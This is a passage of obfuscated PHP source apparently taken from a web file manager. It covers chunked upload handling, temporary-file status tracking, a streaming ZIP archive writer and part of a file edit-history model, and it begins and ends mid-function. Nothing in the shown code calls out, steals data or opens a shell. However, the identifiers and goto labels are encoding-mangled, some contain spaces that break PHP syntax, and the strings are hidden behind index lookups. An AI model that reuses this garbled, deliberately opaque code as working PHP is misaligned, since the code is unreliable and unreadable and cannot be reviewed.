$eÃÛ¬¤„õ = $this->moveUploadedFile($DÙ”ø±…¸ä); if ($a˜Ú³¥ÉİÄ > 0 && filesize($eÃÛ¬¤„õ) == 0) { $this->showJson($CÇô»É‚ˆŠ[1939], !1); } if (!$eÃÛ¬¤„õ) { $this->showJson(LNG($CÇô»É‚ˆŠ[1940]), !1); } goto däÅÊ Ç‹°; däÅÊ Ç‹°: $fÊ…‚Â†’‚ = $bë¹Ãóïì * $Fäù¨Ê§³â; $bƒà‘Ë‘»¯ = @fopen($this->tempFile, $CÇô»É‚ˆŠ[1941]); fseek($bƒà‘Ë‘»¯, $fÊ…‚Â†’‚); goto D¾æÔ¼ßÅ; C³ÄåíÒ”«: if ($aï½Ô¦İù¸ > 1 && $Fäù¨Ê§³â <= 0) { show_json($CÇô»É‚ˆŠ[1938], !1); } if ($Fäù¨Ê§³â > $a˜Ú³¥ÉİÄ) { $aï½Ô¦İù¸ = 1; } if ($aï½Ô¦İù¸ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto b—‹¨Ö¨œ; FÏâö¶ğ¥æ: } private function checkSize() { $e¯Š±æ’Åà =& $_SERVER[õëù©û]; if (phpBuild64() || $this->in[$e¯Š±æ’Åà[77]] < PHP_INT_MAX) { return; } show_json(LNG($e¯Š±æ’Åà[1949]), !1); } private function showJson($F¶˜çÓÓõÍ, $dô¬¯ä—¬ ) { CacheLock::unlock($this->tempFile); if (!$dô¬¯ä—¬ ) { return show_json($F¶˜çÓÓõÍ, $dô¬¯ä—¬ ); } show_json($F¶˜çÓÓõÍ, $dô¬¯ä—¬ ); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto FÃÏ›“‘´É; FÛìõèš²: touch($eØ£µë¾Ù½ . $cŞ”åïá¢Í[1950]); $Bßƒ†¹¹ = isset($this->in[$cŞ”åïá¢Í[1951]]) ? $this->in[$cŞ”åïá¢Í[1951]] : !1; if (strlen($Bßƒ†¹¹) < 30) { $Bßƒ†¹¹ = md5(USER_ID . $this->in[$cŞ”åïá¢Í[75]] . $this->fileName . $this->in[$cŞ”åïá¢Í[77]]); } goto b‘ÓÌ£¬£õ; b‘ÓÌ£¬£õ: $this->tempFile = $eØ£µë¾Ù½ . $cŞ”åïá¢Í[1952] . md5($Bßƒ†¹¹ . $this->in[$cŞ”åïá¢Í[1496]]); goto CòíÇâ®Ğë; FÃÏ›“‘´É: $cŞ”åïá¢Í =& $_SERVER[õëù©û]; $eØ£µë¾Ù½ = TEMP_FILES; @mk_dir($eØ£µë¾Ù½); goto FÛìõèš²; CòíÇâ®Ğë: } private function moveUploadedFile($aˆ‡õÊ‘¸³) { $d—÷ÕÃï…† =& $_SERVER[õëù©û]; $D¯á»ø’¶ˆ = $this->uploadFile; if ($D¯á»ø’¶ˆ == $d—÷ÕÃï…†[1953]) { @file_put_contents($aˆ‡õÊ‘¸³, base64_decode($_REQUEST[$d—÷ÕÃï…†[1954]])); } else { if ($D¯á»ø’¶ˆ == $d—÷ÕÃï…†[1778]) { $eğ¢˜²‚Ç§ = @fopen($aˆ‡õÊ‘¸³, $d—÷ÕÃï…†[1485]); $this->writeTo($D¯á»ø’¶ˆ, $eğ¢˜²‚Ç§, $aˆ‡õÊ‘¸³); } else { if (!move_uploaded_file($D¯á»ø’¶ˆ, $aˆ‡õÊ‘¸³)) { return !1; } } } return $aˆ‡õÊ‘¸³; } private function writeTo($d­¼°ÕõÓ, $AœÑíŸÉÖ, $d¬×µëéõ) { goto f×Î›Ó×Áè; c·§İÆØÌÃ: $eÂ‹ôµŸ† = @fopen($d­¼°ÕõÓ, $E±¹ˆÊõ¨ê[1484]); if (!$eÂ‹ôµŸ† || !$AœÑíŸÉÖ || !$C‡áÀ¹õù‹) { CacheLock::unlock($bÌÈ‹ˆ»Ø¾); return !1; } while (!feof($eÂ‹ôµŸ†)) { fwrite($AœÑíŸÉÖ, fread($eÂ‹ôµŸ†, 1024 * 200)); } goto a×ÉË¹Õœ»; E¦¤ºÊ´Õµ: return !0; goto cé™ƒé­é; f×Î›Ó×Áè: $E±¹ˆÊõ¨ê =& $_SERVER[õëù©û]; $bÌÈ‹ˆ»Ø¾ = $E±¹ˆÊõ¨ê[1955] . $d¬×µëéõ; $C‡áÀ¹õù‹ = CacheLock::lock($bÌÈ‹ˆ»Ø¾, 1); goto c·§İÆØÌÃ; a×ÉË¹Õœ»: fclose($eÂ‹ôµŸ†); fclose($AœÑíŸÉÖ); CacheLock::unlock($bÌÈ‹ˆ»Ø¾); goto E¦¤ºÊ´Õµ; cé™ƒé­é: } private function statusGet() { goto D±èàâö®; a¦ù…êğÖ‘: if (!$this->statusData) { $cÄ–Ù²Öß— = array($fÃ“ˆ õ¼®[28] => $this->fileName, $fÃ“ˆ õ¼®[1943] => 0, $fÃ“ˆ õ¼®[1944] => array()); $this->statusSet($cÄ–Ù²Öß—); } return $this->statusData; goto fÅ‚åñô‹³; Aæ“Œê ‚³: $eóâ›ÈˆŠ— = !1; if (file_exists($E‡å§•‘—ï)) { $eóâ›ÈˆŠ— = @file_get_contents($E‡å§•‘—ï); } if ($eóâ›ÈˆŠ—) { $this->statusData = json_decode($eóâ›ÈˆŠ—, !0); } goto a¦ù…êğÖ‘; D±èàâö®: $fÃ“ˆ õ¼® =& $_SERVER[õëù©û]; if (is_array($this->statusData)) { return $this->statusData; } $E‡å§•‘—ï = $this->tempFile . $fÃ“ˆ õ¼®[1956]; goto Aæ“Œê ‚³; fÅ‚åñô‹³: } public function statusSet($E ¤„âé˜) { $FŠß‚‚á¤„ = $this->tempFile . $_SERVER[õëù©û][1956]; if (!$E ¤„âé˜) { if (file_exists($FŠß‚‚á¤„)) { @unlink($FŠß‚‚á¤„); } return !0; } $this->statusData = $E ¤„âé˜; return file_put_contents($FŠß‚‚á¤„, json_encode($E ¤„âé˜)); } private function initFileTemp() { $f·âÀÁÄÓæ =& $_SERVER[õëù©û]; if (file_exists($this->tempFile)) { return; } $C¯©Œõ˜”ï = fopen($this->tempFile, $f·âÀÁÄÓæ[1957]); fseek($C¯©Œõ˜”ï, $this->in[$f·âÀÁÄÓæ[77]] - 1, SEEK_SET); fwrite($C¯©Œõ˜”ï, $f·âÀÁÄÓæ[463]); fclose($C¯©Œõ˜”ï); } public function checkChunk() { goto E´ŸÚôô§Â; E´ŸÚôô§Â: $A½Ú™§£¬ô =& $_SERVER[õëù©û]; $DˆÙÙ¸Ğçé = array(); CacheLock::lock($this->tempFile); goto D´ª¼›Ùê; DÈˆø×Äø: return $DˆÙÙ¸Ğçé; goto FïÚ‚ÖŠÎ; D´ª¼›Ùê: $aÅÏ‰ë…†² = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($aÅÏ‰ë…†²[$A½Ú™§£¬ô[1944]] as $AïàÄ¼Â‰) { $bÛ‡ß¢¹ å = $AïàÄ¼Â‰[$A½Ú™§£¬ô[160]]; if ($bÛ‡ß¢¹ å) { $DˆÙÙ¸Ğçé[$A½Ú™§£¬ô[1958] . $AïàÄ¼Â‰[$A½Ú™§£¬ô[1027]]] = $bÛ‡ß¢¹ å; } } goto DÈˆø×Äø; FïÚ‚ÖŠÎ: } private function checkChunkHash($BËˆÔ“åÔÍ) { goto fÄœé·ƒ°; A©‰›î¢ãà: return $E»Ô¡ˆ—Àß; goto BğÑ“Õõš; C—Ìí‡§’š: $E»Ô¡ˆ—Àß = !0; foreach ($BËˆÔ“åÔÍ[$E†Î„·ô®©[1944]] as $CŞğãÆÏĞê) { fseek($cèƒ¨¤ãºœ, $CŞğãÆÏĞê[$E†Î„·ô®©[1946]]); $dç»ÄâÕõ = PathDriverStream::hash($cèƒ¨¤ãºœ, $CŞğãÆÏĞê[$E†Î„·ô®©[77]]); if ($CŞğãÆÏĞê[$E†Î„·ô®©[160]] != $dç»ÄâÕõ) { $E»Ô¡ˆ—Àß = !1; break; } } fclose($cèƒ¨¤ãºœ); goto A©‰›î¢ãà; fÄœé·ƒ°: $E†Î„·ô®© =& $_SERVER[õëù©û]; if (count($BËˆÔ“åÔÍ[$E†Î„·ô®©[1944]]) != $BËˆÔ“åÔÍ[$E†Î„·ô®©[1943]]) { return !1; } $eë™§…–ê„ = _get($this->in, $E†Î„·ô®©[1951]); goto F®ÀÚÃ£; F®ÀÚÃ£: $bƒ»ÕÉ™ = _get($this->in, $E†Î„·ô®©[1959]); if (strlen($bƒ»ÕÉ™) == 32 && IO::hashSimple($this->tempFile) == $eë™§…–ê„ && IO::hashMd5($this->tempFile) == $bƒ»ÕÉ™) { return !0; } $cèƒ¨¤ãºœ = fopen($this->tempFile, $E†Î„·ô®©[1153]); goto C—Ìí‡§’š; BğÑ“Õõš: } public static function fileName() { goto d„„¦åÎï; fğ±ß‹ù¯¬: if ($FÒ¤˜±«Á´ == $AöÜÊ‘¢[1961] || $FÒ¤˜±«Á´ == $AöÜÊ‘¢[1962]) { $bôÈË¾ô· = date($AöÜÊ‘¢[685], $e“­Ãƒİ±) . $AöÜÊ‘¢[70] . $in[$AöÜÊ‘¢[77]] . $AöÜÊ‘¢[1593]; } else { if ($FÒ¤˜±«Á´ == $AöÜÊ‘¢[1963]) { $bôÈË¾ô· = date($AöÜÊ‘¢[685], $e“­Ãƒİ±) . $AöÜÊ‘¢[70] . $in[$AöÜÊ‘¢[77]] . $AöÜÊ‘¢[1964]; } } return $bôÈË¾ô·; goto CŠô¼éÅ‹Õ; CŒã¿¤¤ÌÈ: if (!empty($_FILES)) { $bôÈË¾ô· = $bôÈË¾ô· ? $bôÈË¾ô· : $_FILES[$AöÜÊ‘¢[163]][$AöÜÊ‘¢[382]]; } $bôÈË¾ô· = str_replace(array($AöÜÊ‘¢[93], $AöÜÊ‘¢[8]), array($AöÜÊ‘¢[8], $AöÜÊ‘¢[91]), trim($bôÈË¾ô·)); if (!is_wap()) { return $bôÈË¾ô·; } goto dŒœƒÇ©ˆÔ; dŒœƒÇ©ˆÔ: $e“­Ãƒİ± = strtotime($in[$AöÜÊ‘¢[1960]]); $e“­Ãƒİ± = $e“­Ãƒİ± ? $e“­Ãƒİ± : time(); $FÒ¤˜±«Á´ = strtolower($bôÈË¾ô·); goto fğ±ß‹ù¯¬; d„„¦åÎï: $AöÜÊ‘¢ =& $_SERVER[õëù©û]; global $in; $bôÈË¾ô· = isset($in[$AöÜÊ‘¢[28]]) ? $in[$AöÜÊ‘¢[28]] : $AöÜÊ‘¢[33]; goto CŒã¿¤¤ÌÈ; CŠô¼éÅ‹Õ: } private function errorInfo($bğîßøƒ¥İ) { $eµÓÍŞä¼Ê =& $_SERVER[õëù©û]; $D¼ÕŠ¦²å = array($eµÓÍŞä¼Ê[1965], $eµÓÍŞä¼Ê[1966], $eµÓÍŞä¼Ê[1967], $eµÓÍŞä¼Ê[1968], $eµÓÍŞä¼Ê[1969], $eµÓÍŞä¼Ê[1970], $eµÓÍŞä¼Ê[1971], $eµÓÍŞä¼Ê[1972]); return $bğîßøƒ¥İ . $eµÓÍŞä¼Ê[4] . $D¼ÕŠ¦²å[$bğîßøƒ¥İ]; } } class ZipMake { const VERSION = "\x30\x2e\x32\x2e\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($a‹‰ÑÕ = null) { $e§õ‰´…°Š =& $_SERVER[õëù©û]; $this->outputStream = fopen($e§õ‰´…°Š[1973], $e§õ‰´…°Š[1209]); $this->outputName = $a‹‰ÑÕ; $this->needHeaders = !0; } public function addFile($dÒ›ì»ß¿¬, $díè“ë³é) { goto a³Ááˆ™¹‹; a³Ááˆ™¹‹: $FÔ™×ƒÉ¥­ =& $_SERVER[õëù©û]; $dÒ›ì»ß¿¬ = $this->filterFilename($dÒ›ì»ß¿¬); $E¥Ø•«åó = static::METHOD_STORE; goto EùìâÑŸ×Ğ; EùìâÑŸ×Ğ: $EöÑ”ÏŒÉ´ = $this->addFileHeader($dÒ›ì»ß¿¬, $E¥Ø•«åó); $dÊ½“Ù•Û = $D©¢´ó×Â = filesize($díè“ë³é); $Cê˜‰ãš = fopen($díè“ë³é, $FÔ™×ƒÉ¥­[1974]); goto F²¼ØïÆï²; F²¼ØïÆï²: while (!feof($Cê˜‰ãš)) { $b¶Ç…Õ†“á = fread($Cê˜‰ãš, 1048576); $this->send($b¶Ç…Õ†“á); } fclose($Cê˜‰ãš); $Bé²Ú‚Ñ¹ = hexdec(hash_file($FÔ™×ƒÉ¥­[1975], $díè“ë³é)); goto eÊ½Œ‘Ëœ¯; eÊ½Œ‘Ëœ¯: $this->addFileFooter($dÒ›ì»ß¿¬, $E¥Ø•«åó, $Bé²Ú‚Ñ¹, $dÊ½“Ù•Û, $D©¢´ó×Â, $EöÑ”ÏŒÉ´); goto cÉÆ‚ö½¥È; cÉÆ‚ö½¥È: } public function addFileFromStream($B®’‰˜†åé, $aí¿É—øœ) { goto Bµ„Ï›´; aãö÷½³: $FÌ…®‹ª•‘ = hash_init($_SERVER[õëù©û][1975]); while (!feof($aí¿É—øœ)) { $d×âöÅÅÇÖ = fread($aí¿É—øœ, 1048576); hash_update($FÌ…®‹ª•‘, $d×âöÅÅÇÖ); $this->send($d×âöÅÅÇÖ); } $E²ƒÕ“à¥ = hexdec(hash_final($FÌ…®‹ª•‘)); goto a¢ğì£¶ƒ; a¢ğì£¶ƒ: $this->addFileFooter($B®’‰˜†åé, $Cáğô¦¾ , $E²ƒÕ“à¥, $CÅø³›½®œ, $C¢œ¡óÀ¡®, $c†æÈÅìèÖ); goto DÙ¦ìåÆ¥¶; EÜèèš†É: fseek($aí¿É—øœ, 0, SEEK_END); $CÅø³›½®œ = $C¢œ¡óÀ¡® = ftell($aí¿É—øœ); rewind($aí¿É—øœ); goto aãö÷½³; Bµ„Ï›´: $B®’‰˜†åé = $this->filterFilename($B®’‰˜†åé); $Cáğô¦¾  = static::METHOD_STORE; $c†æÈÅìèÖ = $this->addFileHeader($B®’‰˜†åé, $Cáğô¦¾ ); goto EÜèèš†É; DÙ¦ìåÆ¥¶: } public function finish() { foreach ($this->files as $CÚùè£Ò¦Õ) { $this->addCdrFile($CÚùè£Ò¦Õ); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($FÖ§ƒ‰„ÓĞ, $DÛéñŠµÄ) { goto F¯«’†æˆ˜; E°Í–•¬É: return strlen($Cğ›ÜØ÷ ) + $b³Ç‘÷ì§Œ + strlen($b²ì—‘ƒ); goto Bœ–´Õ¥°¤; Cµ·’†š¼: $e° ß¶–½• = $this->dosTime(time()); $EµŠ³®¾Ö§ = array(array($B½ğ®¿ÓòË[1977], static::FILE_HEADER_SIGNATURE), array($B½ğ®¿ÓòË[1978], static::ZIP_VERSION_64), array($B½ğ®¿ÓòË[1978], 8), array($B½ğ®¿ÓòË[1978], $DÛéñŠµÄ), array($B½ğ®¿ÓòË[1977], $e° ß¶–½•), array($B½ğ®¿ÓòË[1977], 0), array($B½ğ®¿ÓòË[1977], 4294967295), array($B½ğ®¿ÓòË[1977], 4294967295), array($B½ğ®¿ÓòË[1978], $b³Ç‘÷ì§Œ), array($B½ğ®¿ÓòË[1978], 32)); $AÊ¦Ñö…Š = array(array($B½ğ®¿ÓòË[1978], 1), array($B½ğ®¿ÓòË[1978], 28), array($B½ğ®¿ÓòË[1979], 0), array($B½ğ®¿ÓòË[1979], 0), array($B½ğ®¿ÓòË[1979], 0), array($B½ğ®¿ÓòË[1977], 0)); goto cœÇñÙµìŸ; cœÇñÙµìŸ: $Cğ›ÜØ÷  = $this->packFields($EµŠ³®¾Ö§); $b²ì—‘ƒ = $this->packFields($AÊ¦Ñö…Š); $this->send($Cğ›ÜØ÷  . $FÖ§ƒ‰„ÓĞ . $b²ì—‘ƒ); goto E°Í–•¬É; F¯«’†æˆ˜: $B½ğ®¿ÓòË =& $_SERVER[õëù©û]; $FÖ§ƒ‰„ÓĞ = preg_replace($B½ğ®¿ÓòË[1976], $B½ğ®¿ÓòË[33], $FÖ§ƒ‰„ÓĞ); $b³Ç‘÷ì§Œ = strlen($FÖ§ƒ‰„ÓĞ); goto Cµ·’†š¼; Bœ–´Õ¥°¤: } protected function addFileFooter($a¾‘×§–¶, $D–„‰ƒåÔÙ, $aÙ¨£¯ì‡Ú, $cì ê…“”›, $F“Ãğ‡¯¤–, $Bà½âª­ö©) { $AÂ¡Ë¾ÓİÔ =& $_SERVER[õëù©û]; $DÃ†çïëÎ = array(array($AÂ¡Ë¾ÓİÔ[1977], static::DATA_DESCRIPTOR_SIGNATURE), array($AÂ¡Ë¾ÓİÔ[1977], $aÙ¨£¯ì‡Ú), array($AÂ¡Ë¾ÓİÔ[1979], $cì ê…“”›), array($AÂ¡Ë¾ÓİÔ[1979], $F“Ãğ‡¯¤–)); $CôõËÃçñÃ = $this->packFields($DÃ†çïëÎ); $this->send($CôõËÃçñÃ); $e½ä¹ªËë = $Bà½âª­ö© + $cì ê…“”› + $câãÈÏËÅœ; $this->addToCdr($a¾‘×§–¶, $D–„‰ƒåÔÙ, $aÙ¨£¯ì‡Ú, $cì ê…“”›, $F“Ãğ‡¯¤–, $e½ä¹ªËë); } private function addToCdr($F³¯óå¾Üù, $dµ²ñ›¸ˆ³, $Fä¶àâ“™, $Dàº–á‘ğŠ, $AµÍŞº½••, $eÉÏ„òÂ²µ) { $this->files[] = array($F³¯óå¾Üù, $dµ²ñ›¸ˆ³, $Fä¶àâ“™, $Dàº–á‘ğŠ, $AµÍŞº½••, $this->ofs); $this->ofs += $eÉÏ„òÂ²µ; } protected function addCdrFile($EÈó¬˜Ò×ç) { goto FøßĞ»Ê‹Ú; FñÀ‹–õ: $this->send($AöÍ¿á‡ñæ); $this->cdr_ofs += strlen($AöÍ¿á‡ñæ); goto bËç´†”í”; FøßĞ»Ê‹Ú: $F„¿¸ˆöÛŒ =& $_SERVER[õëù©û]; list($F£¥÷ì˜ ¬, $cÎ—ŸîÛÓ, $FƒÜ¨¸º”, $e©÷ÎŠé®, $e‘Âµ‰£Äæ, $DÆ çâ‘Ö) = $EÈó¬˜Ò×ç; $AÛéŒ¸‹ = $F„¿¸ˆöÛŒ[33]; goto C¦ã£Ÿ†Òµ; C¦ã£Ÿ†Òµ: $FÈªà”ƒé‚ = $this->dosTime(time()); $A³¾ô‚„®¬ = array(array($F„¿¸ˆöÛŒ[1977], static::CDR_FILE_SIGNATURE), array($F„¿¸ˆöÛŒ[1978], static::ZIP_VERSION_64), array($F„¿¸ˆöÛŒ[1978], static::ZIP_VERSION_64), array($F„¿¸ˆöÛŒ[1978], 8), array($F„¿¸ˆöÛŒ[1978], $cÎ—ŸîÛÓ), array($F„¿¸ˆöÛŒ[1977], $FÈªà”ƒé‚), array($F„¿¸ˆöÛŒ[1977], $FƒÜ¨¸º”), array($F„¿¸ˆöÛŒ[1977], 4294967295), array($F„¿¸ˆöÛŒ[1977], 4294967295), array($F„¿¸ˆöÛŒ[1978], strlen($F£¥÷ì˜ ¬)), array($F„¿¸ˆöÛŒ[1978], 32), array($F„¿¸ˆöÛŒ[1978], strlen($AÛéŒ¸‹)), array($F„¿¸ˆöÛŒ[1978], 0), array($F„¿¸ˆöÛŒ[1978], 0), array($F„¿¸ˆöÛŒ[1977], 32), array($F„¿¸ˆöÛŒ[1977], 4294967295)); $A†Í‰µöÌŠ = array(array($F„¿¸ˆöÛŒ[1978], 1), array($F„¿¸ˆöÛŒ[1978], 28), array($F„¿¸ˆöÛŒ[1979], $e‘Âµ‰£Äæ), array($F„¿¸ˆöÛŒ[1979], $e©÷ÎŠé®), array($F„¿¸ˆöÛŒ[1979], $DÆ çâ‘Ö), array($F„¿¸ˆöÛŒ[1977], 0)); goto F·Å¸¬Ê; F·Å¸¬Ê: $AŒáÈªí™ì = $this->packFields($A³¾ô‚„®¬); $eÄ‡ÙÊÈÒ¦ = $this->packFields($A†Í‰µöÌŠ); $AöÍ¿á‡ñæ = $AŒáÈªí™ì . $F£¥÷ì˜ ¬ . $AÛéŒ¸‹ . $eÄ‡ÙÊÈÒ¦; goto FñÀ‹–õ; bËç´†”í”: } protected function addCdr64Eof() { goto dĞ¡„ƒª¡; dĞ¡„ƒª¡: $A‘²ß÷‹Éâ =& $_SERVER[õëù©û]; $B¥¦Ã¬ÃŸ  = count($this->files); $cõÎÒì¼²Ù = $this->cdr_ofs; goto b‘ÄÄâù™±; b‘ÄÄâù™±: $EøÈ†‘øÏ = $this->ofs; $eòá‚Œ‘ğ = array(array($A‘²ß÷‹Éâ[1977], static::ZIP64_CDR_EOF_SIGNATURE), array($A‘²ß÷‹Éâ[1979], 44), array($A‘²ß÷‹Éâ[1978], static::ZIP_VERSION_64), array($A‘²ß÷‹Éâ[1978], static::ZIP_VERSION_64), array($A‘²ß÷‹Éâ[1977], 0), array($A‘²ß÷‹Éâ[1977], 0), array($A‘²ß÷‹Éâ[1979], $B¥¦Ã¬ÃŸ ), array($A‘²ß÷‹Éâ[1979], $B¥¦Ã¬ÃŸ ), array($A‘²ß÷‹Éâ[1979], $cõÎÒì¼²Ù), array($A‘²ß÷‹Éâ[1979], $EøÈ†‘øÏ)); $d£¥œ²Ë­® = $this->packFields($eòá‚Œ‘ğ); goto c¸ÒÕ£¹; c¸ÒÕ£¹: $this->send($d£¥œ²Ë­®); goto eøÖÓî›”Œ; eøÖÓî›”Œ: } protected function addCdr64Locator() { goto A¹ñÄ•Ø»ç; f©ìÌ¹àå–: $this->send($d°ÅÌ‚èŒ‡); goto cä‘Š½ØØÙ; A¹ñÄ•Ø»ç: $bÃÏò‡¹²£ =& $_SERVER[õëù©û]; $Fˆ±ÕÊŠ¦– = count($this->files); $C³õ·ùª†± = $this->cdr_ofs; goto B¶¥óˆßÕ’; B¶¥óˆßÕ’: $E… ˆ°àÂ² = $this->ofs; $B£ØÛÁ…å£ = array(array($bÃÏò‡¹²£[1977], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($bÃÏò‡¹²£[1977], 0), array($bÃÏò‡¹²£[1979], $E… ˆ°àÂ² + $C³õ·ùª†±), array($bÃÏò‡¹²£[1977], 1)); $d°ÅÌ‚èŒ‡ = $this->packFields($B£ØÛÁ…å£); goto f©ìÌ¹àå–; cä‘Š½ØØÙ: } protected function addCdrEof() { goto EµŞµÀî²Ã; eôÒãÜ´Óé: $aå·êÇ¥‘¿ = $this->ofs; $f´Â©ì‡ô„ = $Aæ§®µÆâ²[33]; $E„Ô¥ğ›Î = array(array($Aæ§®µÆâ²[1977], static::CDR_EOF_SIGNATURE), array($Aæ§®µÆâ²[1978], 0), array($Aæ§®µÆâ²[1978], 0), array($Aæ§®µÆâ²[1978], $DÍåç¡„ˆÂ), array($Aæ§®µÆâ²[1978], $DÍåç¡„ˆÂ), array($Aæ§®µÆâ²[1977], 4294967295), array($Aæ§®µÆâ²[1977], 4294967295), array($Aæ§®µÆâ²[1978], strlen($f´Â©ì‡ô„))); goto C¶ç™‘Ñ ; EµŞµÀî²Ã: $Aæ§®µÆâ² =& $_SERVER[õëù©û]; $DÍåç¡„ˆÂ = count($this->files); $AÆˆÑÕ‹×Ã = $this->cdr_ofs; goto eôÒãÜ´Óé; C¶ç™‘Ñ : $dÎèß„ğáº = $this->packFields($E„Ô¥ğ›Î) . $f´Â©ì‡ô„; $this->send($dÎèß„ğáº); goto c”˜áôÎÈ…; c”˜áôÎÈ…: } protected function addCdr() { foreach ($this->files as $DÌÏÈ­±Ÿù) { $this->addCdrFile($DÌÏÈ­±Ÿù); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $fØÔµ·‰Œ¸ =& $_SERVER[õëù©û]; $Bñº²“çÁÊ = $fØÔµ·‰Œ¸[198]; if ($this->outputName) { $c£ŒòËˆßİ = trim(str_replace(array($fØÔµ·‰Œ¸[112], $fØÔµ·‰Œ¸[55], $fØÔµ·‰Œ¸[93], $fØÔµ·‰Œ¸[67], $fØÔµ·‰Œ¸[213], $fØÔµ·‰Œ¸[983]), $fØÔµ·‰Œ¸[33], $this->outputName)); $fâ¬ŒëÇ¬« = rawurlencode($c£ŒòËˆßİ); $Bñº²“çÁÊ .= "\73\x20\146\x69\x6c\145\x6e\141\155\145\x2a\75\x75\164\146\55\x38\47\x27{$fâ¬ŒëÇ¬«}"; } $f‰®¢ôÃ‘ã = array($fØÔµ·‰Œ¸[195] => $fØÔµ·‰Œ¸[1980], $fØÔµ·‰Œ¸[1981] => $Bñº²“çÁÊ, $fØÔµ·‰Œ¸[1982] => $fØÔµ·‰Œ¸[1983], $fØÔµ·‰Œ¸[1984] => $fØÔµ·‰Œ¸[1985], $fØÔµ·‰Œ¸[1986] => $fØÔµ·‰Œ¸[1987]); foreach ($f‰®¢ôÃ‘ã as $bç›øŒ‘¸Ä => $a¼ˆ¶˜Ô¨) { header($bç›øŒ‘¸Ä . $fØÔµ·‰Œ¸[873] . $a¼ˆ¶˜Ô¨); } } protected function send($E …øºº) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $E …øºº); } protected final function dosTime($B§×ß©Ã÷®) { $D”øé• =& $_SERVER[õëù©û]; $b÷Óæ£Ù§É = getdate($B§×ß©Ã÷®); if ($b÷Óæ£Ù§É[$D”øé•[1690]] < 1980) { $b÷Óæ£Ù§É = array($D”øé•[1690] => 1980, $D”øé•[1988] => 1, $D”øé•[1989] => 1, $D”øé•[1990] => 0, $D”øé•[1991] => 0, $D”øé•[1992] => 0); } $b÷Óæ£Ù§É[$D”øé•[1690]] -= 1980; return $b÷Óæ£Ù§É[$D”øé•[1690]] << 25 | $b÷Óæ£Ù§É[$D”øé•[1988]] << 21 | $b÷Óæ£Ù§É[$D”øé•[1989]] << 16 | $b÷Óæ£Ù§É[$D”øé•[1990]] << 11 | $b÷Óæ£Ù§É[$D”øé•[1991]] << 5 | $b÷Óæ£Ù§É[$D”øé•[1992]] >> 1; } protected function packFields($c÷Ø‘ÌÈ›) { $e°Ê±Š²© =& $_SERVER[õëù©û]; $b™£ƒ„‡í = $e°Ê±Š²©[33]; $C¦óšäó£ = array(); foreach ($c÷Ø‘ÌÈ› as $e´¦ßõ¢Øœ) { $b™£ƒ„‡í .= $e´¦ßõ¢Øœ[0]; $C¦óšäó£[] = $e´¦ßõ¢Øœ[1]; } array_unshift($C¦óšäó£, $b™£ƒ„‡í); return call_user_func_array($e°Ê±Š²©[1993], $C¦óšäó£); } protected function filterFilename($E×Ğ‚»°ÄŠ) { $dèÙÀî£ê =& $_SERVER[õëù©û]; return str_replace(array($dèÙÀî£ê[93], $dèÙÀî£ê[4], $dèÙÀî£ê[172], $dèÙÀî£ê[69], $dèÙÀî£ê[112], $dèÙÀî£ê[918], $dèÙÀî£ê[921], $dèÙÀî£ê[267]), $dèÙÀî£ê[70], $E×Ğ‚»°ÄŠ); } } goto A¬í¯ğ´àÊ; Dç£Ù‘¬¹°: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\162\x63\x65\137\150\151\x73\x74\157\162\171"; public function addHistory($f±§ß—¥­°, $e²– —·£• = '') { $DêÛÒ‹ÕÈ =& $_SERVER[õëù©û]; $E„šë‘ãÌ = array($DêÛÒ‹ÕÈ[379] => $f±§ß—¥­°[$DêÛÒ‹ÕÈ[365]], $DêÛÒ‹ÕÈ[1395] => isset($f±§ß—¥­°[$DêÛÒ‹ÕÈ[375]]) ? $f±§ß—¥­°[$DêÛÒ‹ÕÈ[375]] : $f±§ß—¥­°[$DêÛÒ‹ÕÈ[374]], $DêÛÒ‹ÕÈ[415] => $f±§ß—¥­°[$DêÛÒ‹ÕÈ[414]], $DêÛÒ‹ÕÈ[515] => $f±§ß—¥­°[$DêÛÒ‹ÕÈ[77]], $DêÛÒ‹ÕÈ[2253] => $e²– —·£•); $FİëÒ¯ã‹ä = $GLOBALS[$DêÛÒ‹ÕÈ[6]][$DêÛÒ‹ÕÈ[84]][$DêÛÒ‹ÕÈ[2254]]; if ($FİëÒ¯ã‹ä > 1) { $this->historyAutoClear($E„šë‘ãÌ[$DêÛÒ‹ÕÈ[365]]); $this->add($E„šë‘ãÌ); } Model($DêÛÒ‹ÕÈ[2255])->eventFileEdit($f±§ß—¥­°[$DêÛÒ‹ÕÈ[365]]); } private function historyAutoClear($b”ñæÛË–Ø) { goto FŞŞè§¯›Î; eÅäë¹Å±î: if ($FÈ¼½»ÏÏİ >= 500) { return; } $c¬öÌ „œÀ = array($B‡ùíìá¼[379] => $b”ñæÛË–Ø); $a«Ï†ÀÜ = $this->field($B‡ùíìá¼[2258])->where($c¬öÌ „œÀ)->order($B‡ùíìá¼[2250])->select(); goto A¨Ğ¤¾Û“ó; FŞŞè§¯›Î: $B‡ùíìá¼ =& $_SERVER[õëù©û]; $aÚçƒœƒ©â = Model($B‡ùíìá¼[1079])->get($B‡ùíìá¼[2256]); $fğ—°¬ÚˆÌ = $GLOBALS[$B‡ùíìá¼[6]][$B‡ùíìá¼[84]][$B‡ùíìá¼[2254]]; goto B‰Ù½ÉÉÌÖ; AÁ›µÑ©¬: $cå§Íóñì‰ = array_to_keyvalue($a«Ï†ÀÜ, $B‡ùíìá¼[33], $B‡ùíìá¼[414]); 